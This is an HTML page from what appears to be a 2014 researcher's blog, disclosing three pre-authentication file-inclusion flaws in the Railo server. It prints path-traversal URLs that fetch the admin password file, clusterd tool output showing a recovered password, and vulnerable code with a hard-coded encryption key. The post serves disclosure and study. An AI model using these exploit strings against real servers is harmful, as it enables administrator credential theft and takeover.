@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>railo security - part three - pre-authentication LFI</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>railo security - part three - pre-authentication LFI</h1>
+			<b><time>2014-08-23</time></b>
+		       
+
+			<div>
+				<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one - intro</a></em><br>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two - post-authentication rce</a></em><br>
+<em>Part three - pre-authentication LFI</em><br>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four - pre-authentication rce</a></em></p>
+<p>This post continues our four part Railo security analysis with three pre-authentication LFI vulnerabilities.  These allow anonymous users access to retrieve the administrative plaintext password and login to the server&rsquo;s administrative interfaces.  If you&rsquo;re unfamiliar with Railo, I recommend at the very least reading part one of this series.  The most significant LFI discussed has been implemented as auxiliary modules in <a href="http://github.com/hatRiot/clusterd">clusterd</a>, though they&rsquo;re pretty trivial to exploit on their own.</p>
+<p>We&rsquo;ll kick this portion off by introducing a pre-authentication LFI vulnerability that affects all versions of Railo Express; if you&rsquo;re unfamiliar with the Express install, it&rsquo;s really just a self-contained, no-installation-necessary package that harnesses Jetty to host the service.   The flaw actually has nothing to do with Railo itself, but rather in this packaged web server, Jetty.  <a href="http://www.cvedetails.com/cve/CVE-2007-6672/">CVE-2007-6672</a> addresses this issue, but it appears that the Railo folks have not bothered to update this.  Via the browser, we can pull the config file, complete with the admin hash, with <code>http://[host]:8888/railo-context/admin/..\..\railo-web.xml.cfm</code>.</p>
+<p>A quick run of this in clusterd on Railo 4.0:</p>
+<pre tabindex="0"><code>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.0 --rl-pw
+
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
+
+ [2014-05-15 06:25PM] Started at 2014-05-15 06:25PM
+ [2014-05-15 06:25PM] Servers&#39; OS hinted at windows
+ [2014-05-15 06:25PM] Fingerprinting host &#39;192.168.1.219&#39;
+ [2014-05-15 06:25PM] Server hinted at &#39;railo&#39;
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server...
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Server Administrator...
+ [2014-05-15 06:25PM] Checking railo version 4.0 Railo Web Administrator...
+ [2014-05-15 06:25PM] Matched 3 fingerprints for service railo
+ [2014-05-15 06:25PM]   Railo Server (version 4.0)
+ [2014-05-15 06:25PM]   Railo Server Administrator (version 4.0)
+ [2014-05-15 06:25PM]   Railo Web Administrator (version 4.0)
+ [2014-05-15 06:25PM] Fingerprinting completed.
+ [2014-05-15 06:25PM] Attempting to pull password...
+ [2014-05-15 06:25PM] Fetched encrypted password, decrypting...
+ [2014-05-15 06:25PM] Decrypted password: default
+ [2014-05-15 06:25PM] Finished at 2014-05-15 06:25PM
+</code></pre><p>and on the latest release of Railo, 4.2:</p>
+<pre tabindex="0"><code>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.2 --rl-pw
+
+        clusterd/0.3 - clustered attack toolkit
+            [Supporting 6 platforms]
+
+ [2014-05-15 06:28PM] Started at 2014-05-15 06:28PM
+ [2014-05-15 06:28PM] Servers&#39; OS hinted at windows
+ [2014-05-15 06:28PM] Fingerprinting host &#39;192.168.1.219&#39;
+ [2014-05-15 06:28PM] Server hinted at &#39;railo&#39;
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server...
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Server Administrator...
+ [2014-05-15 06:28PM] Checking railo version 4.2 Railo Web Administrator...
+ [2014-05-15 06:28PM] Matched 3 fingerprints for service railo
+ [2014-05-15 06:28PM]   Railo Server (version 4.2)
+ [2014-05-15 06:28PM]   Railo Server Administrator (version 4.2)
+ [2014-05-15 06:28PM]   Railo Web Administrator (version 4.2)
+ [2014-05-15 06:28PM] Fingerprinting completed.
+ [2014-05-15 06:28PM] Attempting to pull password...
+ [2014-05-15 06:28PM] Fetched password hash: d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b
+ [2014-05-15 06:28PM] Finished at 2014-05-15 06:28PM
+</code></pre><p>Using this LFI, we can pull the <code>railo-web.xml.cfm</code> file, which contains the administrative password.  Notice that 4.2 only dumps a hash, whilst 4.0 dumps a plaintext password.  This is because versions &lt;= 4.0 blowfish encrypt the password, and &gt; 4.0 actually hashes it.  Here&rsquo;s the relevant code from Railo (ConfigWebFactory.java):</p>
+<pre tabindex="0"><code>private static void loadRailoConfig(ConfigServerImpl configServer, ConfigImpl config, Document doc) throws IOException  {
+        Element railoConfiguration = doc.getDocumentElement();
+
+        // password
+        String hpw=railoConfiguration.getAttribute(&#34;pw&#34;);
+        if(StringUtil.isEmpty(hpw)) {
+            // old password type
+            String pwEnc = railoConfiguration.getAttribute(&#34;password&#34;); // encrypted password (reversable)
+            if (!StringUtil.isEmpty(pwEnc)) {
+                String pwDec = new BlowfishEasy(&#34;tpwisgh&#34;).decryptString(pwEnc);
+                hpw=hash(pwDec);
+            }
+        }
+        if(!StringUtil.isEmpty(hpw))
+            config.setPassword(hpw);
+        else if (configServer != null) {
+            config.setPassword(configServer.getDefaultPassword());
+        }
+</code></pre><p>As above, they actually encrypted the password using a hard-coded symmetric key; this is where versions &lt;= 4.0 stop.  In &gt; 4.0, after decryption they hash the password (SHA256) and use it as such.  Note that the encryption/decryption is no longer the actual password in &gt; 4.0, so we cannot simply decrypt the value to use and abuse.</p>
+<p>Due to the configuration of the web server, we can only pull CFM files; this is fine for the configuration file, but system files prove troublesome&hellip;</p>
+<figure><img src="http://diyblogger.net/wp-content/uploads/2010/12/billy-mays.jpg"/>
+</figure>
+
+<p>The second LFI is a trivial XXE that affects versions &lt;= 4.0, and is exploitable out-of-the-box with Metasploit.  Unlike the Jetty LFI, this affects all versions of Railo, both installed and express:</p>
+<figure><img src="/images/posts/2014/railo/railo-xxe-msf.jpg"/>
+</figure>
+
+<p>Using this we cannot pull <code>railo-web.xml.cfm</code> due to it containing XML headers, and we cannot use the standard OOB methods for retrieving files.  Timothy Morgan gave a great <a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf">talk</a> at OWASP Appsec 2013 that detailed a neat way of abusing Java XML parsers to obtain RCE via XXE.  The process is pretty interesting; if you submit a URL with a jar:// protocol handler, the server will download the zip/jar to a temporary location, perform some header parsing, and then delete it.  However, if you push the file and leave the connection open, the file will persist.  This vector, combined with one of the other LFI&rsquo;s, could be a reliable pre-authentication RCE, but I was unable to get it working.</p>
+<p>The third LFI is just as trivial as the first two, and again stems from the pandemic problem of failing to authenticate at the URL/page level.  <code>img.cfm</code> is a file used to, you guessed it, pull images from the system for display.  Unfortunately, it fails to sanitize anything:</p>
+<pre tabindex="0"><code>&lt;cfset path=&#34;resources/img/#attributes.src#.cfm&#34;&gt;
+&lt;cfparam name=&#34;application.adminimages&#34; default=&#34;#{}#&#34;&gt;
+&lt;cfif StructKeyExists(application.adminimages,path) and false&gt;
+    &lt;cfset str=application.adminimages[path]&gt;
+&lt;cfelse&gt;
+    &lt;cfsavecontent variable=&#34;str&#34; trim&gt;&lt;cfinclude template=&#34;#path#&#34;&gt;&lt;/cfsavecontent&gt;
+    &lt;cfset application.adminimages[path]=str&gt;
+&lt;/cfif&gt;
+</code></pre><p>By fetching this page with <code>attributes.src</code> set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we&rsquo;ve done above, lets grab <code>railo-web.xml.cfm</code>; we can do this with the following url: <code>http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&amp;thistag.executionmode=start</code> which simply returns</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;railo-configuration pw=&#34;d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b&#34; version=&#34;4.2&#34;&gt;
+</code></pre><p>This vulnerability exists in 3.3 - 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.</p>
+<p>Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it&rsquo;s not quite that simple; if we attempt to access a non-existent file, we see the following:</p>
+<pre tabindex="0"><code>The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29
+</code></pre><p>Notice the <code>zip://</code> handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:</p>
+<pre tabindex="0"><code>&lt;cfinclude&gt;#attributes.src#&lt;/cfinclude&gt;
+</code></pre><p>Then it would have been trivially exploitable via RFI.  As it stands, it&rsquo;s not possible to modify the handler without prior code execution.</p>
+<p>To sum up the LFI&rsquo;s: all versions and all installs are vulnerable via the <code>img.cfm</code> vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions &lt;= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.</p>
+<p>This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
